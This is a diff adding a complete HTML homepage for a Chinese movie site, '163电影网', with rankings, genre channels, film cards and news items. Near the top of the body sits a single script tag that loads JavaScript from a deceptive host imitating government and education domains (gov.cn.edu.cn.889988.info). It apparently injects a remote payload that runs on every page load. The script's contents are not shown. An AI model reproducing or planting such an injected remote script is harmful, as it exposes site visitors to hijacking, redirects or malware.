@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="163电影网, 163dianyingwang-zh, 在线电影, 高清电影, 电影排行榜, 影视推荐">
+<meta name="description" content="163电影网 - 电影，从这里开始。海量正版高清影片，每日更新排行榜单与精选推荐，分类清晰更新及时。官方网址：https://163dianyingwang-zh.github.io">
+<title>163电影网 | 电影，从这里开始</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  :root{
+    --red:#d32f2f;--red2:#b71c1c;--ink:#1a1a1a;--paper:#f4f1ea;--kraft:#e8e2d6;
+    --stamp:#0d47a1;--line:#d8d2c6;
+  }
+  body{font-family:"PingFang SC","Noto Sans CJK SC","Microsoft YaHei",sans-serif;background:var(--paper);color:var(--ink);line-height:1.75;overflow-x:hidden;}
+  body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(rgba(0,0,0,.035) 1px,transparent 1px);background-size:5px 5px;z-index:-1;}
+  a{text-decoration:none;color:inherit;}
+  ::selection{background:var(--red);color:#fff;}
+  .wrap{max-width:1160px;margin:0 auto;padding:0 26px;}
+
+  /* ===== Top ===== */
+  .top{background:var(--ink);color:#fff;padding:10px 0;font-size:12.5px;}
+  .top .wrap{display:flex;justify-content:space-between;color:#bbb;}
+  .top a:hover{color:#fff;}
+  .top .r{display:flex;gap:22px;}
+  nav{border-bottom:4px solid var(--red);background:var(--paper);position:sticky;top:0;z-index:100;box-shadow:0 3px 14px rgba(0,0,0,.08);}
+  nav .wrap{display:flex;align-items:center;justify-content:space-between;height:78px;}
+  .logo{display:flex;align-items:center;gap:14px;}
+  .mark{width:56px;height:56px;border:3px solid var(--red);border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;transform:rotate(-4deg);}
+  .mark b{font-size:22px;font-weight:900;color:var(--red);line-height:.9;}
+  .mark span{font-size:7px;letter-spacing:1px;color:var(--red);}
+  .logo h1{font-size:25px;font-weight:900;letter-spacing:1px;}
+  .logo h1 i{font-style:normal;color:var(--red);}
+  .logo small{display:block;font-size:11px;color:#888;letter-spacing:2px;}
+  .menu{display:flex;gap:6px;}
+  .menu a{padding:10px 16px;font-weight:800;font-size:15px;border-radius:8px;transition:.2s;}
+  .menu a:hover{background:var(--red);color:#fff;}
+  .menu a.hot{background:var(--red);color:#fff;}
+
+  /* ===== Hero ===== */
+  .hero{display:grid;grid-template-columns:1.4fr 1fr;gap:0;border:3px solid var(--ink);margin:38px 0;border-radius:6px;overflow:hidden;background:#fff;}
+  .hero .lead{padding:52px 46px;position:relative;}
+  .hero .lead .no{font-size:13px;color:var(--red);font-weight:900;letter-spacing:3px;}
+  .hero .lead h2{font-size:60px;font-weight:900;line-height:1.05;margin:14px 0;}
+  .hero .lead h2 i{font-style:normal;color:var(--red);}
+  .hero .lead .sub{font-size:16px;color:#555;margin-bottom:26px;}
+  .hero .lead .url{font-size:12.5px;color:#777;background:var(--kraft);display:inline-block;padding:8px 16px;border-radius:6px;margin-bottom:26px;}
+  .hero .lead .url b{color:var(--red);}
+  .search{display:flex;border:2px solid var(--ink);border-radius:8px;overflow:hidden;max-width:440px;}
+  .search input{flex:1;border:none;padding:14px 16px;font-size:15px;outline:none;background:#fff;}
+  .search button{background:var(--red);color:#fff;border:none;padding:0 28px;font-weight:900;font-size:15px;cursor:pointer;}
+  .hero .stamp{padding:52px 34px;background:var(--kraft);display:flex;flex-direction:column;justify-content:center;border-left:2px dashed #c2bbac;position:relative;}
+  .hero .stamp .r{font-size:13px;color:#555;font-weight:800;letter-spacing:2px;}
+  .hero .stamp .num{font-size:76px;font-weight:900;color:var(--stamp);line-height:1;}
+  .hero .stamp .num small{font-size:26px;font-weight:800;}
+  .hero .stamp .txt{font-size:13px;color:#555;margin-top:14px;border-top:1px solid #c2bbac;padding-top:14px;}
+
+  /* ===== Ranking ===== */
+  .rank{border:2px solid var(--ink);border-radius:6px;overflow:hidden;margin-bottom:26px;}
+  .rank .hd{background:var(--ink);color:#fff;padding:16px 26px;display:flex;align-items:center;gap:14px;}
+  .rank .hd .tag{background:var(--red);font-size:12px;font-weight:900;padding:4px 12px;border-radius:4px;letter-spacing:2px;}
+  .rank .hd h3{font-size:20px;font-weight:900;}
+  .rank .hd .more{margin-left:auto;font-size:13px;color:#bbb;}
+  .rank .hd .more:hover{color:#fff;}
+  .rank .bd{display:grid;grid-template-columns:repeat(5,1fr);}
+  .ri{padding:24px 20px;border-right:1px solid var(--line);position:relative;}
+  .ri:last-child{border-right:none;}
+  .ri .rn{font-size:34px;font-weight:900;color:var(--red);line-height:1;font-family:Georgia,serif;}
+  .ri h4{font-size:16px;font-weight:900;margin:12px 0 6px;}
+  .ri .score{font-size:12px;color:#777;}
+  .ri .score b{color:var(--stamp);}
+
+  /* ===== Section ===== */
+  section{padding:60px 0;}
+  .sh{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:32px;gap:20px;flex-wrap:wrap;}
+  .sh h3{font-size:30px;font-weight:900;border-left:8px solid var(--red);padding-left:16px;}
+  .sh h3 i{font-style:normal;color:var(--red);}
+  .sh p{font-size:13px;color:#888;margin-top:8px;}
+  .more-btn{font-size:13px;font-weight:800;color:var(--red);border:2px solid var(--red);padding:8px 20px;border-radius:6px;transition:.2s;}
+  .more-btn:hover{background:var(--red);color:#fff;}
+
+  /* ===== Channel ===== */
+  .chan{display:grid;grid-template-columns:repeat(3,1fr);gap:22px;}
+  .ch{border:2px solid var(--ink);border-radius:6px;overflow:hidden;background:#fff;transition:.25s;}
+  .ch:hover{transform:translate(-4px,-4px);box-shadow:8px 8px 0 var(--red);}
+  .ch .cvc{height:150px;position:relative;display:flex;align-items:flex-end;padding:18px;}
+  .ch .cvc span{font-size:11px;background:var(--ink);color:#fff;padding:5px 11px;border-radius:4px;font-weight:800;}
+  .ch .cvc h4{font-size:20px;font-weight:900;color:#fff;margin-left:auto;text-shadow:0 2px 8px rgba(0,0,0,.4);}
+  .ch p{font-size:13px;color:#666;padding:18px 20px;}
+  .ch .meta{font-size:12px;color:var(--red);font-weight:800;padding:0 20px 18px;}
+  .c1{background:linear-gradient(135deg,#b71c1c,#ff7043);}
+  .c2{background:linear-gradient(135deg,#0d47a1,#26c6da);}
+  .c3{background:linear-gradient(135deg,#1b5e20,#aed581);}
+  .c4{background:linear-gradient(135deg,#4a148c,#f48fb1);}
+  .c5{background:linear-gradient(135deg,#e65100,#ffd54f);}
+  .c6{background:linear-gradient(135deg,#263238,#78909c);}
+
+  /* ===== Poster grid ===== */
+  .pgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
+  .pc{border:2px solid var(--ink);border-radius:6px;overflow:hidden;background:#fff;transition:.25s;}
+  .pc:hover{transform:translate(-4px,-4px);box-shadow:7px 7px 0 var(--stamp);}
+  .pc .pv{height:220px;position:relative;}
+  .pc .pv .top-l{position:absolute;top:12px;left:12px;background:var(--red);color:#fff;font-size:11px;font-weight:900;padding:5px 10px;border-radius:4px;}
+  .pc .pv .top-r{position:absolute;top:12px;right:12px;background:#fff;font-size:11px;font-weight:900;padding:5px 10px;border-radius:4px;}
+  .pc .pv .bt{position:absolute;bottom:14px;left:14px;right:14px;text-align:center;background:var(--ink);color:#fff;font-size:13px;font-weight:800;padding:9px;border-radius:4px;opacity:0;transform:translateY(8px);transition:.25s;}
+  .pc:hover .pv .bt{opacity:1;transform:translateY(0);}
+  .pc .pi{padding:16px 18px;}
+  .pc .pi h4{font-size:17px;font-weight:900;}
+  .pc .pi .i{font-size:12px;color:#888;margin-top:8px;display:flex;justify-content:space-between;}
+  .p1{background:linear-gradient(160deg,#d32f2f,#ff8a65);}
+  .p2{background:linear-gradient(160deg,#1565c0,#80deea);}
+  .p3{background:linear-gradient(160deg,#2e7d32,#cddc39);}
+  .p4{background:linear-gradient(160deg,#6a1b9a,#f06292);}
+  .p5{background:linear-gradient(160deg,#ef6c00,#ffe082);}
+  .p6{background:linear-gradient(160deg,#37474f,#b0bec5);}
+  .p7{background:linear-gradient(160deg,#00838f,#b2dfdb);}
+  .p8{background:linear-gradient(160deg,#c2185b,#f48fb1);}
+
+  /* ===== News ===== */
+  .news{display:grid;grid-template-columns:1.15fr 1fr;gap:24px;}
+  .feat{border:2px solid var(--ink);border-radius:6px;overflow:hidden;background:#fff;}
+  .feat .fi{height:260px;background:linear-gradient(135deg,var(--stamp),var(--red));position:relative;display:flex;align-items:flex-end;padding:26px;}
+  .feat .fi .lb{position:absolute;top:20px;left:20px;background:var(--ink);color:#fff;font-size:11px;font-weight:900;padding:5px 12px;border-radius:4px;}
+  .feat .fi h4{font-size:24px;font-weight:900;color:#fff;}
+  .feat .ft{padding:24px;}
+  .feat .ft p{font-size:14px;color:#555;margin-bottom:16px;}
+  .feat .ft a{color:var(--red);font-weight:800;font-size:14px;}
+  .nlist{display:flex;flex-direction:column;}
+  .ni{border-bottom:1px dashed var(--line);padding:18px 4px;display:flex;gap:16px;align-items:flex-start;transition:.2s;}
+  .ni:hover{background:var(--kraft);}
+  .ni .d{font-size:12px;color:var(--red);font-weight:900;min-width:52px;}
+  .ni h5{font-size:15px;font-weight:800;flex:1;}
+
+  /* ===== Sitemap ===== */
+  .map{border:3px solid var(--ink);border-radius:6px;background:#fff;padding:44px;}
+  .map .top2{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:30px;}
+  .mh{font-size:26px;font-weight:900;}
+  .mh i{font-style:normal;color:var(--red);}
+  .map .top2 p{font-size:13.5px;color:#666;margin-top:12px;}
+  .map .top2 .u{color:var(--red);font-weight:800;display:block;margin-top:12px;font-size:13px;}
+  .mc h5{font-size:15px;color:var(--red);margin-bottom:14px;font-weight:900;}
+  .mc a{display:block;font-size:13.5px;color:#555;padding:6px 0;border-bottom:1px dotted var(--line);}
+  .mc a:hover{color:var(--red);padding-left:6px;}
+
+  /* ===== Footer ===== */
+  footer{border-top:6px solid var(--red);background:var(--ink);color:#bbb;padding:44px 24px 26px;text-align:center;font-size:13px;}
+  footer .fh{font-size:22px;color:#fff;font-weight:900;margin-bottom:10px;}
+  footer .fh i{font-style:normal;color:var(--red);}
+  footer a{color:#fff;}
+  footer .ln{margin:6px 0 18px;}
+
+  /* ===== Responsive ===== */
+  @media(max-width:980px){
+    .hero{grid-template-columns:1fr;}
+    .hero .stamp{border-left:none;border-top:2px dashed #c2bbac;}
+    .rank .bd{grid-template-columns:repeat(2,1fr);}
+    .ri{border-bottom:1px solid var(--line);}
+    .chan{grid-template-columns:1fr 1fr;}
+    .pgrid{grid-template-columns:1fr 1fr;}
+    .news{grid-template-columns:1fr;}
+    .map .top2{grid-template-columns:1fr 1fr;}
+    .menu{display:none;}
+  }
+  @media(max-width:560px){
+    .hero .lead h2{font-size:38px;}
+    .hero .lead,.hero .stamp{padding:34px 24px;}
+    .chan{grid-template-columns:1fr;}
+    .pgrid{grid-template-columns:1fr;}
+    .sh h3{font-size:23px;}
+    .logo h1{font-size:20px;}
+    section{padding:42px 0;}
+    .map{padding:28px 20px;}
+    .map .top2{grid-template-columns:1fr;}
+    .rank .bd{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- Top info -->
+<div class="top"><div class="wrap">
+  <div>欢迎来到 163电影网 · 电影，从这里开始</div>
+  <div class="r"><a href="#">RSS 订阅</a><a href="#">设为首页</a><a href="#">留言反馈</a><a href="#">免责声明</a></div>
+</div></div>
+
+<!-- Nav -->
+<nav><div class="wrap">
+  <div class="logo"><div class="mark"><b>163</b><span>电影</span></div><div><h1><i>163</i>电影网</h1><small>163 DIANYING · 正版高清 · 每日更新</small></div></div>
+  <div class="menu">
+    <a href="#home" class="hot">首页</a><a href="#rank">排行榜</a><a href="#film">电影库</a><a href="#chan">频道</a><a href="#news">影视资讯</a><a href="#map">网站地图</a>
+  </div>
+</div></nav>
+
+<!-- Hero -->
+<section id="home"><div class="wrap"><div class="hero">
+  <div class="lead">
+    <div class="no">◉ 官方站 · OFFICIAL</div>
+    <h2>电影，<br>从<i>这里</i>开始</h2>
+    <p class="sub">海量正版高清影片，每日更新排行榜单与精选推荐，分类清晰、播放流畅，163电影网陪你看好每一部电影。</p>
+    <div class="url">官方网址：<b>https://163dianyingwang-zh.github.io</b></div>
+    <div class="search"><input type="text" placeholder="输入片名 / 演员 / 类型，开始找片…"><button>搜 索</button></div>
+  </div>
+  <div class="stamp">
+    <div class="r">第 163 期 · 影迷专刊</div>
+    <div class="num">163<small>部</small></div>
+    <div class="txt">本期精选 163 部高分佳作，涵盖动作、喜剧、爱情、科幻、悬疑等全类型，一键直达，畅快观影。</div>
+  </div>
+</div></div></section>
+
+<!-- Ranking -->
+<section id="rank" style="padding-top:0;"><div class="wrap">
+  <div class="rank">
+    <div class="hd"><span class="tag">TOP 5</span><h3>本周口碑排行榜</h3><a href="#" class="more">更多榜单 →</a></div>
+    <div class="bd">
+      <div class="ri"><div class="rn">01</div><h4>周处除三害</h4><div class="score"><b>8.6</b> · 动作 / 犯罪</div></div>
+      <div class="ri"><div class="rn">02</div><h4>沙丘2</h4><div class="score"><b>8.8</b> · 科幻 / 史诗</div></div>
+      <div class="ri"><div class="rn">03</div><h4>飞驰人生2</h4><div class="score"><b>8.3</b> · 喜剧 / 运动</div></div>
+      <div class="ri"><div class="rn">04</div><h4>默杀</h4><div class="score"><b>8.1</b> · 悬疑 / 犯罪</div></div>
+      <div class="ri"><div class="rn">05</div><h4>好东西</h4><div class="score"><b>8.9</b> · 爱情 / 文艺</div></div>
+    </div>
+  </div>
+</div></section>
+
+<!-- Channels -->
+<section id="chan"><div class="wrap">
+  <div class="sh"><div><h3>六大<i>频道</i></h3><p>按类型快速找片，分类齐全不迷路</p></div><a href="#" class="more-btn">全部频道 →</a></div>
+  <div class="chan">
+    <div class="ch"><div class="cvc c1"><span>动作 · 冒险</span><h4>硬核大片</h4></div><p>热血追逐、震撼打斗，院线级视觉冲击，一次看过瘾。</p><div class="meta">1,286 部影片 ▸</div></div>
+    <div class="ch"><div class="cvc c2"><span>喜剧 · 温情</span><h4>轻松一刻</h4></div><p>合家欢喜剧、治愈暖片，疲惫生活的快乐解药。</p><div class="meta">1,042 部影片 ▸</div></div>
+    <div class="ch"><div class="cvc c3"><span>悬疑 · 犯罪</span><h4>反转不断</h4></div><p>高能烧脑、层层反转，不到最后一秒猜不到结局。</p><div class="meta">867 部影片 ▸</div></div>
+    <div class="ch"><div class="cvc c4"><span>爱情 · 文艺</span><h4>心动瞬间</h4></div><p>浪漫爱情、细腻文艺，感受银幕上的心动时刻。</p><div class="meta">934 部影片 ▸</div></div>
+    <div class="ch"><div class="cvc c5"><span>科幻 · 奇幻</span><h4>想象无界</h4></div><p>宏大世界观、未来想象，带你抵达未知的远方。</p><div class="meta">612 部影片 ▸</div></div>
+    <div class="ch"><div class="cvc c6"><span>动画 · 纪录</span><h4>多元视野</h4></div><p>匠心动画、真实纪录，看见世界的更多可能。</p><div class="meta">498 部影片 ▸</div></div>
+  </div>
+</div></section>
+
+<!-- Films -->
+<section id="film" style="background:rgba(0,0,0,.03);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="sh"><div><h3>精选<i>电影</i></h3><p>163电影网编辑部精选，每周持续更新</p></div><a href="#" class="more-btn">全部影片 →</a></div>
+    <div class="pgrid">
+      <div class="pc"><div class="pv p1"><span class="top-l">热映</span><span class="top-r">★8.6</span><span class="bt">▶ 立即播放</span></div><div class="pi"><h4>周处除三害</h4><div class="i"><span>动作 / 犯罪</span><span>中国台湾</span></div></div></div>
+      <div class="pc"><div class="pv p2"><span class="top-l">大片</span><span class="top-r">★8.8</span><span class="bt">▶ 立即播放</span></div><div class="pi"><h4>沙丘2</h4><div class="i"><span>科幻 / 史诗</span><span>美国</span></div></div></div>
+      <div class="pc"><div class="pv p3"><span class="top-l">口碑</span><span class="top-r">★8.3</span><span class="bt">▶ 立即播放</span></div><div class="pi"><h4>飞驰人生2</h4><div class="i"><span>喜剧 / 运动</span><span>中国大陆</span></div></div></div>
+      <div class="pc"><div class="pv p4"><span class="top-l">催泪</span><span class="top-r">★8.4</span><span class="bt">▶ 立即播放</span></div><div class="pi"><h4>你好，李焕英</h4><div class="i"><span>喜剧 / 亲情</span><span>中国大陆</span></div></div></div>
+      <div class="pc"><div class="pv p5"><span class="top-l">高分</span><span class="top-r">★8.9</span><span class="bt">▶ 立即播放</span></div><div class="pi"><h4>好东西</h4><div class="i"><span>爱情 / 文艺</span><span>中国大陆</span></div></div></div>
+      <div class="pc"><div class="pv p6"><span class="top-l">经典</span><span class="top-r">★9.2</span><span class="bt">▶ 立即播放</span></div><div class="pi"><h4>肖申克的救赎</h4><div class="i"><span>剧情</span><span>美国</span></div></div></div>
+      <div class="pc"><div class="pv p7"><span class="top-l">治愈</span><span class="top-r">★9.0</span><span class="bt">▶ 立即播放</span></div><div class="pi"><h4>小森林</h4><div class="i"><span>美食 / 治愈</span><span>日本</span></div></div></div>
+      <div class="pc"><div class="pv p8"><span class="top-l">新片</span><span class="top-r">★8.1</span><span class="bt">▶ 立即播放</span></div><div class="pi"><h4>默杀</h4><div class="i"><span>悬疑 / 犯罪</span><span>中国大陆</span></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- News -->
+<section id="news"><div class="wrap">
+  <div class="sh"><div><h3>影视<i>资讯</i></h3><p>163 编辑部 · 每日精选好内容</p></div><a href="#" class="more-btn">更多资讯 →</a></div>
+  <div class="news">
+    <div class="feat"><div class="fi"><span class="lb">头条</span><h4>2026 春节档前瞻：多部重磅大片蓄势待发</h4></div><div class="ft"><p>从合家欢喜剧到硬核动作，今年春节档阵容豪华，163电影网将第一时间上线正版片源，陪你热闹过大年。</p><a href="#">阅读全文 →</a></div></div>
+    <div class="nlist">
+      <div class="ni"><span class="d">01·22</span><h5>4K 修复经典老片计划启动，高画质重温黄金时代</h5></div>
+      <div class="ni"><span class="d">01·18</span><h5>悬疑剧成黑马，国产推理口碑持续走高</h5></div>
+      <div class="ni"><span class="d">01·14</span><h5>动画电影精选推荐，大人小孩都能看</h5></div>
+      <div class="ni"><span class="d">01·10</span><h5>本周新片速递：8 部佳作值得关注</h5></div>
+      <div class="ni"><span class="d">01·06</span><h5>163电影网全新分类上线，找片更高效</h5></div>
+    </div>
+  </div>
+</div></section>
+
+<!-- Sitemap -->
+<section id="map" style="padding-top:0;"><div class="wrap">
+  <div class="map">
+    <div class="top2">
+      <div><div class="mh"><i>163</i>电影网</div><p>电影，从这里开始。海量正版高清影片，每日更新排行榜单与精选推荐，分类齐全、播放流畅。</p><span class="u">🔗 https://163dianyingwang-zh.github.io</span></div>
+      <div class="mc"><h5>电影频道</h5><a href="#">动作大片</a><a href="#">喜剧搞笑</a><a href="#">爱情文艺</a><a href="#">科幻奇幻</a><a href="#">悬疑犯罪</a></div>
+      <div class="mc"><h5>更多内容</h5><a href="#">热播剧集</a><a href="#">热门综艺</a><a href="#">动漫频道</a><a href="#">纪录片</a><a href="#">经典老片</a></div>
+      <div class="mc"><h5>关于本站</h5><a href="#">关于 163电影网</a><a href="#">排行榜单</a><a href="#">留言反馈</a><a href="#">免责声明</a><a href="#">联系我们</a></div>
+    </div>
+  </div>
+</div></section>
+
+<footer>
+  <div class="fh"><i>163</i>电影网</div>
+  <div class="ln">官方网址：<a href="https://163dianyingwang-zh.github.io">https://163dianyingwang-zh.github.io</a></div>
+  <div>© 2025 163电影网（163dianyingwang-zh）· 内容仅供学习交流，版权归原作者及发行方所有</div>
+</footer>
+
+</body>
+</html>
